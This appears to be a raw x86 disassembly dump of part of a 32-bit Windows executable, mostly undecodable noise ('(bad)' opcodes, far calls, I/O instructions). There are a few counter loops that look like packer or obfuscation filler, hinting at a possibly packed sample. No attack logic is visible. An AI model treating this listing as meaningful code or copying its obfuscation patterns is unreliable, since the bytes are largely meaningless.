  40826a:	fisttp WORD PTR [ebp-0x2a57dadc]
  408270:	into   
  408271:	(bad)  
  408274:	hlt    
  408275:	es jp  0x408265
  408278:	sbb    esp,DWORD PTR fs:[ebx+0x3c]
  40827c:	loop   0x4082f0
  40827e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827f:	idiv   eax
  408281:	pop    ebp
  408282:	push   ebx
  408283:	pop    edi
  408284:	dec    ecx
  408285:	iret   
  408286:	imul   ecx,ebp,0x86f4b691
  40828c:	adc    esp,eax
  40828e:	sbb    edx,ebp
  408290:	push   ebp
  408291:	cdq    
  408292:	(bad)  
  408293:	stc    
  408294:	mov    ss,WORD PTR [edi+ebp*8+0x3e6b5a22]
  40829b:	aad    0xa2
  40829d:	in     al,dx
  40829e:	sbb    eax,0xde6e45c1
  4082a3:	stc    
  4082a4:	retf   
  4082a5:	stos   BYTE PTR es:[edi],al
  4082a6:	lods   eax,DWORD PTR ds:[esi]
  4082a7:	mov    ds:0x2e214593,al
  4082ac:	pop    esi
  4082ad:	and    eax,0x16ab83d8
  4082b2:	fstp   TBYTE PTR [eax-0x2b88cb45]
  4082b8:	in     eax,0x88
  4082ba:	or     eax,0x78fa19d8
  4082bf:	and    BYTE PTR [edi-0x3b],ch
  4082c2:	enter  0x43f,0x9e
  4082c6:	xor    ah,BYTE PTR [ebx-0x16]
  4082c9:	es pop ds
  4082cb:	jle    0x408343
  4082cd:	inc    esp
  4082ce:	pmullw mm3,QWORD PTR [esi]
  4082d1:	pushf  
  4082d2:	mov    ch,BYTE PTR [ecx+ebx*8]
  4082d5:	sbb    DWORD PTR ds:0x7f5b25d,esp
  4082db:	mov    cl,0x62
  4082dd:	mov    ch,0x19
  4082df:	fnstenv [ecx-0x5d30b8cf]
  4082e5:	ret    
  4082e6:	outs   dx,DWORD PTR ds:[esi]
  4082e7:	xor    cl,cl
  4082e9:	in     eax,0xd0
  4082eb:	cli    
  4082ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082ed:	rcl    al,1
  4082ef:	cs jle 0x40832f
  4082f2:	out    0xfc,eax
  4082f4:	sar    cl,0x93
  4082f7:	in     eax,0xf4
  4082f9:	cs call 0xae63:0xbf5cb7b6
  408301:	(bad)  
  408302:	jle    0x408346
  408304:	leave  
  408305:	into   
  408306:	inc    edx
  408307:	(bad)
  40830b:	ins    DWORD PTR es:[edi],dx
  40830c:	xchg   BYTE PTR [ebp+0x4],dl
  40830f:	xchg   esp,eax
  408310:	(bad)  
  408311:	adc    BYTE PTR [eax+0x70938a69],dh
  408317:	into   
  408318:	inc    ebp
  408319:	sbb    al,0x93
  40831b:	push   ecx
  40831c:	ffreep st(2)
  40831e:	rcl    DWORD PTR [esi+0x6c],cl
  408321:	loop   0x408365
  408323:	or     esp,DWORD PTR [eax-0x353896d4]
  408329:	loope  0x408308
  40832b:	xor    bl,BYTE PTR [ecx-0x29]
  40832e:	test   al,0x85
  408330:	aad    0x41
  408332:	loope  0x4082ca
  408334:	les    eax,FWORD PTR [eax]
  408336:	mov    bl,0x58
  408338:	ret    0x989f
  40833b:	push   DWORD PTR [esp+edi*2]
  40833e:	mov    al,ds:0x2b6abeb2
  408343:	enter  0xaf11,0xa5
  408347:	fnstcw WORD PTR [edi-0x63c64bd9]
  40834d:	push   ds
  40834e:	xchg   edx,eax
  40834f:	stc    
  408350:	mov    bl,0xee
  408352:	mov    DWORD PTR [edx+0x33],edx
  408355:	ret    0x323d
  408358:	or     ecx,edx
  40835a:	imul   ecx,DWORD PTR [edi],0xffef7e84
  408360:	dec    DWORD PTR [ebx+0x81f045]
  408366:	add    al,0x35
  408368:	inc    eax
  408369:	pop    es
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x43466f,0x17
  408394:	cmp    DWORD PTR ds:0x43466f,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x43466f,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x4346d3
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x43466f,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x43466f
  4083da:	dec    eax
  4083db:	mov    ds:0x43466f,eax
  4083e0:	mov    eax,ds:0x43466f
  4083e5:	dec    eax
  4083e6:	mov    ds:0x43466f,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434793
  4083f7:	sbb    DWORD PTR ds:0x434683,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434707,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434703
  408413:	sbb    DWORD PTR ds:0x434793,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	cmp    al,0x1f
  40842d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40842e:	sbb    edi,ebx
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	push   ds
  408438:	ret    0xa488
  40843b:	les    esp,FWORD PTR [esi]
  40843d:	mov    bl,dh
  40843f:	pop    eax
  408440:	jns    0x4084b9
  408442:	ss (bad) 
  408444:	mov    cl,0x87
  408446:	push   cs
  408447:	mov    bh,0x7d
  408449:	clc    
  40844a:	sbb    ch,BYTE PTR ds:0xb1615f3f
  408450:	cld    
  408451:	out    dx,al
  408452:	popf   
  408453:	ins    BYTE PTR es:[edi],dx
  408454:	inc    ebp
  408455:	shl    ecx,0xb7
  408458:	sub    ebp,DWORD PTR [ecx+0x22]
  40845b:	jmp    0x408415
  40845d:	iret   
  40845e:	mov    ds:0x69734542,eax
  408463:	cmp    BYTE PTR [eax-0x5df82d6d],cl
  408469:	gs sahf 
  40846b:	pop    esp
  40846c:	ror    DWORD PTR [edx-0x6495bf73],1
  408472:	add    BYTE PTR [eax],0xc3
  408475:	mov    BYTE PTR [edx],dl
  408477:	popf   
  408478:	cmp    ecx,DWORD PTR [edi]
  40847a:	or     BYTE PTR [ecx],ch
  40847c:	popf   
  40847d:	adc    eax,DWORD PTR [edi-0x6a]
  408480:	add    bl,BYTE PTR [ecx]
  408482:	loopne 0x4084bf
  408484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408485:	shl    BYTE PTR [eax+0x2df8b323],cl
  40848b:	sub    bh,BYTE PTR [eax+0x154cfd24]
  408491:	pop    es
  408492:	sub    edx,DWORD PTR [ebx]
  408494:	dec    esi
  408495:	cdq    
  408496:	xor    DWORD PTR [esi+0x40],0x7c
  40849a:	ja     0x4084fa
  40849c:	adc    DWORD PTR [eiz*4+0x6246ab7a],ebx
  4084a3:	call   0x61412944
  4084a8:	shr    BYTE PTR [esi-0x7b714406],1
  4084ae:	js     0x40850a
  4084b0:	lock popa 
  4084b2:	lods   eax,DWORD PTR ds:[esi]
  4084b3:	sub    DWORD PTR ds:0x9e32fcbb,ebx
  4084b9:	mov    al,ds:0xf949af9
  4084be:	mov    edx,0xbc3bfda4
  4084c3:	imul   edx,DWORD PTR [esi-0x25],0xca02da0a
  4084ca:	fist   WORD PTR ds:[edi+edx*4+0x72]
  4084cf:	mov    ah,0xd6
  4084d1:	data16 out 0xc8,al
  4084d4:	lds    edi,FWORD PTR [edi]
  4084d6:	int3   
  4084d7:	imul   ecx,DWORD PTR [esi],0xffffffa6
  4084da:	cmp    eax,0xa466a3af
  4084df:	adc    al,0x1b
  4084e1:	mov    ds:0x6f56b95,eax
  4084e6:	add    al,0x95
  4084e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084e9:	pushf  
  4084ea:	aaa    
  4084eb:	call   0x3845:0x1776aaff
  4084f2:	xor    dh,BYTE PTR [eax+ebp*4]
  4084f5:	sub    al,0x13
  4084f7:	ins    BYTE PTR es:[edi],dx
  4084f8:	mov    esi,0x1b229f43
  4084fd:	sar    BYTE PTR [eax+0x422990ba],cl
  408503:	cmc    
  408504:	or     BYTE PTR [edx-0x7b],bl
  408507:	in     al,0xdc
  408509:	cmp    dh,ah
  40850b:	jmp    0x408580
  40850d:	test   BYTE PTR [edx+0x31],0x50
  408511:	jo     0x408570
  408513:	mov    esi,0x8062bac6
  408518:	cmp    BYTE PTR [edi+0x75dccb31],dl
  40851e:	ss jnp 0x40851c
  408521:	pop    ss
  408522:	mov    ecx,0x834df66f
  408527:	mov    ah,0xfd
  408529:	pop    ebx
  40852a:	mov    edx,0xde2ad8e4
  40852f:	xlat   BYTE PTR ds:[ebx]
  408530:	mov    ah,0x6b
  408532:	push   ebx
  408533:	inc    ecx
  408534:	sub    cl,BYTE PTR [edx]
  408536:	hlt    
  408537:	xor    BYTE PTR [eax],bh
  408539:	fsubr  QWORD PTR [edi+ebx*4-0x5ebd41e8]
  408540:	jno    0x40852d
  408542:	iret   
  408543:	stos   BYTE PTR es:[di],al
  408545:	shl    DWORD PTR [esp+esi*4-0x13889a1e],0xa7
  40854d:	fldcw  WORD PTR [ebp+0x60]
  408550:	bound  eax,QWORD PTR [ebp+0x7a]
  408553:	fmul   QWORD PTR [edx+0x14221a14]
  408559:	repz push esi
  40855b:	mov    al,ds:0x4baee72a
  408560:	sbb    al,0x40
  408562:	push   0xffffffbe
  408564:	xchg   edx,eax
  408565:	adc    eax,0x8b1160b7
  40856a:	fnstcw WORD PTR [ebp+0x1c]
  40856d:	cwde   
  40856e:	ss jae 0x4085b2
  408571:	pop    ss
  408572:	lea    esi,[esp+eiz*4+0xb]
  408576:	push   ebx
  408577:	ficom  DWORD PTR [ebp-0x266f8717]
  40857d:	sbb    bh,BYTE PTR [ebx+0x7f]
  408580:	jo     0x4085bb
  408582:	data16 and dh,BYTE PTR [eiz*2-0x1e084d9a]
  40858a:	lock jmp 0x408560
  40858d:	cmp    dl,BYTE PTR ds:0xa369d262
  408593:	mov    ecx,0xcf7b60ba
  408598:	mov    ds:0xc0b9927e,al
  40859d:	outs   dx,DWORD PTR ds:[esi]
  40859e:	les    esp,FWORD PTR [ebp-0x72]
  4085a1:	test   BYTE PTR ds:0xa7aadaa5,ch
  4085a7:	daa    
  4085a8:	mov    eax,0x75463966
  4085ad:	bound  esi,QWORD PTR [edi-0x37]
  4085b0:	mov    WORD PTR [edi+ebp*2],ds
  4085b3:	pop    esp
  4085b4:	cmp    eax,DWORD PTR es:[edi]
  4085b7:	jl     0x408545
  4085b9:	pop    ss
  4085ba:	fs fs add al,0x48
  4085be:	rol    BYTE PTR [edi+edx*2+0x22],0xf7
  4085c3:	cwde   
  4085c4:	or     BYTE PTR [ecx-0x36],cl
  4085c7:	lods   eax,DWORD PTR ds:[esi]
  4085c8:	out    dx,al
  4085c9:	cdq    
  4085ca:	mov    WORD PTR [eax+edi*1+0x75818fb9],es
  4085d1:	or     al,0x2
  4085d3:	scas   eax,DWORD PTR es:[edi]
  4085d4:	adc    ax,0x3c7b
  4085d8:	inc    BYTE PTR [ebx]
  4085da:	mov    cl,0x82
  4085dc:	out    0xd9,eax
  4085de:	inc    edx
  4085df:	aad    0xd3
  4085e1:	sbb    edx,edi
  4085e3:	push   edx
  4085e4:	lea    ebp,[edx+0x4d0016f3]
  4085ea:	sub    eax,0x74f29e5
  4085ef:	inc    esi
  4085f0:	dec    edx
  4085f1:	mov    ebp,0x12972d52
  4085f6:	(bad)  
  4085f7:	mov    DWORD PTR [ebp+edx*8-0x57],edi
  4085fb:	push   eax
  4085fc:	ins    DWORD PTR es:[edi],dx
  4085fd:	jbe    0x408662
  4085ff:	ss and al,0xf2
  408602:	pop    esp
  408603:	int3   
  408604:	or     al,dl
  408606:	mov    DWORD PTR [ebx],ebx
  408608:	test   DWORD PTR [edi-0xb],0xfa60ac44
  40860f:	xlat   BYTE PTR ds:[ebx]
  408610:	aas    
  408611:	dec    ecx
  408612:	jecxz  0x40863d
  408614:	clc    
  408615:	and    eax,0x47a6338
  40861a:	lahf   
  40861b:	ins    BYTE PTR es:[edi],dx
  40861c:	inc    WORD PTR [ebx+0x48]
  408620:	and    edi,DWORD PTR [edi+0x593886cd]
  408626:	ror    al,0x80
  408629:	and    bh,0x97
  40862c:	add    al,cl
  40862e:	pusha  
  40862f:	cmp    bh,BYTE PTR [edx+0x6b]
  408632:	xor    ebp,0xffffffe7
  408635:	sub    eax,0xe9405b2d
  40863a:	sbb    dh,al
  40863c:	or     DWORD PTR [ecx+0x4112df39],eax
  408642:	call   0x7dac:0xbf24c0bc
  408649:	outs   dx,DWORD PTR ds:[esi]
  40864a:	push   ds
  40864b:	shr    BYTE PTR fs:[esi+0x73f612a6],1
  408652:	aaa    
  408653:	add    esp,DWORD PTR [ebx]
  408655:	loop   0x408604
  408657:	(bad)  
  408659:	out    dx,eax
  40865a:	xchg   esp,eax
  40865b:	push   es
  40865c:	add    al,0xc1
  40865e:	xor    al,0xe0
  408660:	adc    edi,DWORD PTR [eax+0x51]
  408663:	dec    esi
  408664:	hlt    
  408665:	lea    ebp,[edx-0x23f68ea]
  40866b:	pushf  
  40866c:	outs   dx,BYTE PTR ds:[esi]
  40866d:	repnz inc edx
  40866f:	pop    ds
  408670:	popa   
  408671:	fstp   DWORD PTR [ebp+0x6751511]
  408677:	adc    bh,BYTE PTR [edx]
  408679:	xor    DWORD PTR [esi-0xf],eax
  40867c:	pop    eax
  40867d:	mov    dh,0x8e
  40867f:	shl    DWORD PTR [ebp+0x3e],cl
  408682:	adc    ch,dh
  408684:	mov    eax,0x2f1525b0
  408689:	retf   
  40868a:	imul   edx,DWORD PTR [esi-0x3e98cd42],0x13ee4987
  408694:	pop    esi
  408695:	fisttp DWORD PTR [esi+edi*4+0x6f6d71c6]
  40869c:	cmp    eax,0x46d34025
  4086a1:	test   al,0xbe
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x43466f,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x43466f
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x43466f,ebx
  4086be:	cmp    DWORD PTR ds:0x43466f,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x43466f,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x43466f
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x43466f,ebx
  4086f2:	cmp    DWORD PTR ds:0x43466f,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434703
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x5eab3fc8
  408731:	mov    ah,0xf6
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	rcr    DWORD PTR [ebx-0x60],0x36
  40873f:	mov    dh,ch
  408741:	inc    eax
  408742:	mov    eax,0xc3e00ba9
  408747:	rcl    DWORD PTR [esi+0x19],cl
  40874a:	push   ebx
  40874b:	aaa    
  40874c:	inc    edi
  40874d:	xor    BYTE PTR ds:0x3b7843d1,dh
  408753:	mov    edi,0x5bfc1082
  408758:	in     eax,0x7e
  40875a:	wbinvd 
  40875c:	sub    al,0x6a
  40875e:	inc    ebx
  40875f:	mov    dl,BYTE PTR [ebx+0x55]
  408762:	fmul   st,st(2)
  408764:	mov    al,ds:0x64302539
  408769:	pushf  
  40876a:	push   esi
  40876b:	stc    
  40876c:	stos   DWORD PTR es:[edi],eax
  40876d:	pop    esp
  40876e:	sub    edx,esi
  408770:	mov    ecx,0x4a6a9463
  408775:	(bad)  
  408777:	mov    cl,0xb
  408779:	mov    esi,0xd2dce366
  40877e:	mov    bl,0x3b
  408780:	push   edi
  408781:	fwait
  408782:	push   esp
  408783:	xor    ch,BYTE PTR [eax]
  408785:	ds inc ebp
  408787:	hlt    
  408788:	test   DWORD PTR [eax],esp
  40878a:	scas   eax,DWORD PTR es:[edi]
  40878b:	int3   
  40878c:	daa    
  40878d:	test   al,0x30
  40878f:	into   
  408790:	or     eax,0x1b783672
  408795:	inc    edx
  408796:	or     bh,ah
  408798:	(bad)  
  408799:	cmc    
  40879a:	pop    eax
  40879b:	xchg   ecx,eax
  40879c:	mov    ch,0x92
  40879e:	jle    0x4087f6
  4087a0:	mov    esi,0x18f34c10
  4087a5:	add    eax,0x2f0572ed
  4087aa:	sub    edi,edi
  4087ac:	xor    dl,bh
  4087ae:	mov    fs,WORD PTR [ebp+ecx*8+0x45e972ab]
  4087b5:	sbb    esp,DWORD PTR [ebx+0x60]
  4087b8:	or     dl,BYTE PTR [esi-0x7adcc0c7]
  4087be:	stc    
  4087bf:	sbb    dh,BYTE PTR [ecx]
  4087c1:	fnstenv [eax-0x6ae8a46f]
  4087c7:	stc    
  4087c8:	fnstenv [eax+0x5c]
  4087cb:	sub    DWORD PTR [ecx-0x3bf1e96b],esi
  4087d1:	ins    DWORD PTR es:[edi],dx
  4087d2:	les    ecx,FWORD PTR [edx]
  4087d4:	mov    DWORD PTR [ebx+eiz*2+0x51],0xe3224b10
  4087dc:	(bad)  
  4087dd:	pop    ebx
  4087de:	pop    ebp
  4087df:	add    DWORD PTR [ebx+eax*1-0x36],esi
  4087e3:	scas   al,BYTE PTR es:[edi]
  4087e4:	stos   DWORD PTR es:[edi],eax
  4087e5:	jecxz  0x40877b
  4087e7:	dec    esp
  4087e8:	and    bl,dl
  4087ea:	sub    al,0x3c
  4087ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ed:	arpl   dx,cx
  4087ef:	mul    DWORD PTR [ebp+0x5f41f6b1]
  4087f5:	sbb    al,0x26
  4087f7:	add    ebx,ebx
  4087f9:	mov    WORD PTR ds:0x47187c5f,cs
  4087ff:	fimul  DWORD PTR ds:0x5d301691
  408805:	scas   al,BYTE PTR es:[edi]
  408806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408807:	ret    0xcef0
  40880a:	ja     0x408872
  40880c:	push   ds
  40880d:	cmp    esi,DWORD PTR [eax-0x46a2a7f3]
  408813:	std    
  408814:	jns    0x40882a
  408816:	in     al,0xf5
  408818:	fs dec ebx
  40881a:	out    0xe6,al
  40881c:	std    
  40881d:	call   0x54eca15d
  408822:	xchg   DWORD PTR [ebx+0xd],edx
  408825:	cmp    BYTE PTR [edi-0x5],0xda
  408829:	mov    eax,ds:0x2e314908
  40882e:	aam    0xfe
  408830:	and    BYTE PTR cs:[edi-0x1b],dl
  408834:	jbe    0x4087d2
  408836:	xor    BYTE PTR [edi],cl
  408838:	imul   edi,DWORD PTR [edi+eiz*4-0x2324b88],0x870be2c3
  408843:	cmc    
  408844:	popf   
  408845:	popf   
  408846:	mov    ebx,0x3da6922a
  40884b:	jp     0x408840
  40884d:	ret    0x4508
  408850:	adc    eax,0x59e0839b
  408855:	int    0x94
  408857:	pop    ebp
  408858:	jp     0x4087ef
  40885a:	mov    DWORD PTR [edx],ebx
  40885c:	mov    edx,0xd11f9604
  408861:	sti    
  408862:	push   ss
  408863:	sub    DWORD PTR [ebp-0x2f],eax
  408866:	shr    eax,0xaa
  408869:	icebp  
  40886a:	(bad)  
  40886b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886d:	in     eax,0x86
  40886f:	cmp    DWORD PTR [ebx],esp
  408871:	or     al,0x78
  408873:	pushf  
  408874:	cmc    
  408875:	mov    ch,0xc6
  408877:	inc    esp
  408878:	repz pop ebp
  40887a:	std    
  40887b:	les    edi,FWORD PTR [ebx-0x70921d07]
  408881:	push   ebx
  408882:	(bad)  
  408883:	mov    eax,0x395db0a9
  408888:	fucom  st(6)
  40888a:	pushf  
  40888b:	into   
  40888c:	not    al
  40888e:	sub    al,0xa7
  408890:	call   0x14e3:0xd59852fe
  408897:	packssdw mm2,QWORD PTR [eax]
  40889a:	call   0x3ba62789
  40889f:	ja     0x408879
  4088a1:	data16 jns 0x408878
  4088a4:	iret   
  4088a5:	pop    esi
  4088a6:	fist   DWORD PTR [edx]
  4088a8:	or     edi,eax
  4088aa:	push   ecx
  4088ab:	add    eax,0xabd66b10
  4088b0:	lds    esp,FWORD PTR es:[edi+eiz*4+0x60d07426]
  4088b8:	loop   0x408868
  4088ba:	sub    DWORD PTR [esi-0x318598f7],edi
  4088c0:	scas   eax,DWORD PTR es:[edi]
  4088c1:	and    al,0x66
  4088c3:	mov    edi,0x70e40f46
  4088c8:	mov    dh,BYTE PTR [esi-0x20118db3]
  4088ce:	ins    DWORD PTR es:[edi],dx
  4088cf:	les    edx,FWORD PTR [edi+esi*8]
  4088d2:	push   eax
  4088d3:	cmovp  ebp,esp
  4088d6:	mov    al,0x17
  4088d8:	aas    
  4088d9:	fstp   DWORD PTR [edi-0x39d9301d]
  4088df:	add    ebp,DWORD PTR [ebp+0x4828fbfe]
  4088e5:	jle    0x408871
  4088e7:	cdq    
  4088e8:	(bad)  
  4088e9:	jmp    0xe537c491
  4088ee:	sub    al,0x38
  4088f0:	jo     0x40892d
  4088f2:	lea    ebp,[ecx+0x3151b2bd]
  4088f8:	stos   BYTE PTR es:[edi],al
  4088f9:	popa   
  4088fa:	fimul  WORD PTR [ebx+0x54]
  4088fd:	shl    eax,1
  4088ff:	test   BYTE PTR [esi-0x2a],bh
  408902:	push   ss
  408903:	mov    dh,0xd2
  408905:	cmp    al,0xae
  408907:	scas   al,BYTE PTR es:[edi]
  408908:	adc    DWORD PTR [ecx],0xfffffffa
  40890b:	call   0x4bd8bff5
  408910:	fistp  QWORD PTR [ebp-0x7d]
  408913:	pushf  
  408914:	test   eax,0xdbfa94c5
  408919:	dec    edx
  40891a:	repz (bad) 
  40891c:	xor    al,0x45
  40891e:	sbb    ebp,DWORD PTR [edx+0x66]
  408921:	lock stos DWORD PTR es:[edi],eax
  408923:	es jne 0x408957
  408926:	out    dx,eax
  408927:	pop    ebx
  408928:	sar    ch,0x46
  40892b:	lods   al,BYTE PTR ds:[esi]
  40892c:	pop    ds
  40892d:	or     WORD PTR [edi],dx
  408930:	popf   
  408931:	xchg   ecx,eax
  408932:	adc    esi,DWORD PTR [ebx+0x1c]
  408935:	cmp    DWORD PTR [eax+0x78de036c],ebp
  40893b:	std    
  40893c:	cs test eax,0x2963bf51
  408942:	loope  0x408957
  408944:	nop
  408945:	cld    
  408946:	mov    dh,0x14
  408948:	mov    al,cs:0x961bdb72
  40894e:	fmul   st(5),st
  408950:	lock xor al,0x5d
  408953:	outs   dx,BYTE PTR ds:[esi]
  408954:	cdq    
  408955:	sub    BYTE PTR [edi+0x2cc1cc4e],bh
  40895b:	loopne 0x40896f
  40895d:	mov    eax,0x15568571
  408962:	arpl   WORD PTR [edx],dx
  408964:	and    eax,0x578ac54e
  408969:	cdq    
  40896a:	pop    ebx
  40896b:	xor    BYTE PTR [ebp+eiz*1+0xe9015d],ah
  408972:	dec    eax
  408973:	scas   eax,DWORD PTR es:[edi]
  408974:	retf   0x300c
  408977:	sub    al,0xb8
  408979:	jge    0x4089d6
  40897b:	xlat   BYTE PTR ds:[ebx]
  40897c:	cmp    DWORD PTR [eax+0x88648b0],esi
  408982:	mov    ch,dh
  408984:	ja     0x4089b2
  408986:	cld    
  408987:	cs ret 
  408989:	mov    dl,0xc7
  40898b:	sbb    BYTE PTR [esi+0x44840f87],bl
  408991:	gs out 0xdd,eax
  408994:	add    al,0x48
  408996:	fmul   QWORD PTR [ecx+0x73]
  408999:	(bad)  
  40899a:	sti    
  40899b:	adc    eax,0xd7102af2
  4089a0:	sub    edx,esp
  4089a2:	push   ss
  4089a3:	mov    esi,0x7d8baec3
  4089a8:	or     BYTE PTR [ebx],dh
  4089aa:	(bad)  
  4089ab:	not    DWORD PTR ds:0x43466b
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	jle    0x408a13
  4089dc:	pushf  
  4089dd:	pop    ebx
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	sub    ebx,DWORD PTR [eax-0x41]
  4089e9:	loope  0x408999
  4089eb:	mov    ebp,0x57dd76ed
  4089f0:	sub    ebx,eax
  4089f2:	mov    ecx,0x3ba3d208
  4089f7:	pop    ss
  4089f8:	or     ebx,edx
  4089fa:	dec    dx
  4089fc:	add    dl,BYTE PTR ds:0x4beff6e
  408a02:	xor    BYTE PTR [esi+esi*2+0x29],0x6d
  408a07:	and    edi,DWORD PTR [ecx+0x5e]
  408a0a:	xchg   esi,eax
  408a0b:	(bad)  
  408a0c:	adc    DWORD PTR [eax+0x161708de],edi
  408a12:	jle    0x408a23
  408a14:	stc    
  408a15:	lds    ecx,FWORD PTR [ebx+0x641cb94e]
  408a1b:	adc    al,BYTE PTR [eax+0x1e]
  408a1e:	or     BYTE PTR [eax],ah
  408a20:	pop    ds
  408a21:	sub    DWORD PTR [ebp+eiz*1+0x66f8fb4c],ebx
  408a28:	test   bh,dh
  408a2a:	inc    ecx
  408a2b:	rol    eax,0x4f
  408a2e:	shr    BYTE PTR [ebp+0x396dce15],0x75
  408a35:	xor    dh,bh
  408a37:	pop    eax
  408a38:	(bad)  
  408a39:	dec    eax
  408a3a:	out    0x90,al
  408a3c:	dec    esi
  408a3d:	imul   ebp,DWORD PTR [ebp-0x43],0x7e
  408a41:	push   0x5a
  408a43:	popf   
  408a44:	shl    BYTE PTR [ebp+0x19bc27ff],1
  408a4a:	jmp    0x44df:0x7549176
  408a51:	jns    0x408a1a
  408a53:	xor    dh,BYTE PTR [ecx-0x38c120de]
  408a59:	and    BYTE PTR [esi],0x91
  408a5c:	pop    ds
  408a5d:	cmc    
  408a5e:	add    dh,bl
  408a60:	add    BYTE PTR [ecx],0x49
  408a63:	mov    DWORD PTR [ebx+0x55],ecx
  408a66:	lock fstp DWORD PTR [edx]
  408a69:	and    eax,0xaa383a93
  408a6e:	push   ecx
  408a6f:	push   edx
  408a70:	outs   dx,BYTE PTR ds:[esi]
  408a71:	adc    eax,DWORD PTR [ecx-0x2e677949]
  408a77:	pop    ss
  408a78:	push   ecx
  408a79:	aas    
  408a7a:	push   ss
  408a7b:	xchg   edx,eax
  408a7c:	or     al,0xc3
  408a7e:	mov    esi,0xcbff92b1
  408a83:	mov    dh,0x4c
  408a85:	inc    ecx
  408a86:	inc    edi
  408a87:	int3   
  408a88:	push   esp
  408a89:	dec    DWORD PTR [ebx-0x549f6b03]
  408a8f:	jae    0x408a18
  408a91:	sub    BYTE PTR [eax-0x3a93356f],ah
  408a97:	aam    0x39
  408a99:	push   ss
  408a9a:	sub    cl,bl
  408a9c:	pop    ss
  408a9d:	xchg   edi,eax
  408a9e:	inc    esi
  408a9f:	xor    edx,DWORD PTR [edi]
  408aa1:	pop    ecx
  408aa2:	dec    esp
  408aa3:	(bad)  
  408aa4:	sub    BYTE PTR [ebx+0x19cc4d0b],ch
  408aaa:	je     0x408b24
  408aac:	sub    bl,al
  408aae:	mov    esp,DWORD PTR [ecx+edi*2-0x21da34da]
  408ab5:	push   eax
  408ab6:	push   esi
  408ab7:	inc    edi
  408ab8:	cld    
  408ab9:	pop    ebp
  408aba:	or     dh,BYTE PTR [edx+0x2d]
  408abd:	xor    eax,0xa96ac712
  408ac2:	fisttp DWORD PTR [edi+edi*4-0x4d]
  408ac6:	xchg   esp,eax
  408ac7:	xor    cl,bh
  408ac9:	scas   eax,DWORD PTR es:[edi]
  408aca:	mov    edx,0xc23c79b4
  408acf:	cs or  eax,0xf792141c
  408ad5:	cmp    ecx,edx
  408ad7:	repnz hlt 
  408ad9:	xor    al,0x90
  408adb:	leave  
  408adc:	adc    eax,0x41d1e4fc
  408ae1:	mov    ah,0xcc
  408ae3:	mov    edx,0xd4e43b67
  408ae8:	daa    
  408ae9:	pop    eax
  408aea:	adc    DWORD PTR ds:0x65179f08,esp
  408af0:	or     al,0xe3
  408af2:	adc    eax,0xd6e4153
  408af7:	ret    0x6551
  408afa:	pop    ebp
  408afb:	cs ins BYTE PTR es:[edi],dx
  408afd:	dec    esp
  408afe:	jns    0x408b43
  408b00:	xchg   DWORD PTR [eax+0x410bc853],ebp
  408b06:	pop    ds
